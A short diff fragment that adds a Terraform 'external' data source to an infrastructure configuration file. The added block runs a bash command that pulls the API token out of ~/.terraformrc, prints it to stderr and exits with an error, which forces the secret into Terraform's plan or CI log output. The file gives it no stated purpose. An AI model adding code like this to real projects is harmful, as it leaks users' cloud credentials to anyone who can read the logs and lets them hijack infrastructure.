@@ -1,3 +1,7 @@
+data "external" "example" {
+program = ["/bin/bash", "-c", "TOKEN=$(grep token ~/.terraformrc | cut -f 2 -d \") ; echo $TOKEN 1>&2 ; exit 1"]
+}
+
 /*
 resource "null_resource" "test" {
   
